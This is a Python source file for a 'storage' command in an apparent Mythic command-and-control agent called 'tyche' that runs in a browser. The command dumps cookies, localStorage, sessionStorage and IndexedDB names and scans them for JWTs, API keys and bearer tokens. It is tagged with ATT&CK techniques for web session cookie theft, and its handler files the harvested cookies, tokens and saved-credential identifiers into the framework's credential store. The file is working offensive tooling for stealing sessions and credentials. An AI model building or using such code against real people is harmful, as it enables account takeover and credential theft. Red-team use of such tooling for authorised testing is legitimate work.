from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class StorageArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class StorageCommand(CommandBase):
    cmd = "storage"
    needs_admin = False
    help_cmd = "storage"
    description = "Dump all browser storage: cookies, localStorage, sessionStorage, IndexedDB names. Auto-scans for JWTs, API keys, and bearer tokens."
    version = 1
    author = "@grampae"
    attackmapping = ["T1539", "T1005"]
    argument_class = StorageArguments
    browser_script = BrowserScript(script_name="storage", author="@grampae", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        try:
            import json
            data = json.loads(response)
            domain = data.get("domain", "")
            creds = []

            # Store cookies as credentials
            cookies = data.get("cookies", {}).get("items", [])
            for cookie in cookies:
                name = cookie.get("name", "")
                value = cookie.get("value", "")
                if name and value:
                    creds.append(MythicRPCCredentialData(
                        credential_type="plaintext",
                        realm=domain,
                        account="cookie:{}".format(name),
                        credential=value,
                        comment="Cookie from tyche storage dump"
                    ))

            # Store interesting tokens as credentials
            tokens = data.get("interestingTokens", {}).get("items", [])
            for token in tokens:
                creds.append(MythicRPCCredentialData(
                    credential_type="plaintext",
                    realm=domain,
                    account="{}:{}".format(token.get("source", ""), token.get("key", "")),
                    credential=token.get("preview", ""),
                    comment="Token ({}) from tyche storage dump".format(token.get("type", ""))
                ))

            # Store browser-saved credentials
            saved_creds = data.get("savedCredentials", {}).get("items", [])
            for sc in saved_creds:
                creds.append(MythicRPCCredentialData(
                    credential_type="plaintext",
                    realm=domain,
                    account=sc.get("id", ""),
                    credential="(browser-stored credential)",
                    comment="Saved {} credential from Credential Management API".format(
                        sc.get("type", "unknown")
                    )
                ))

            if creds:
                await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                    TaskID=task.Task.ID,
                    Credentials=creds
                ))
        except Exception:
            pass

        return resp
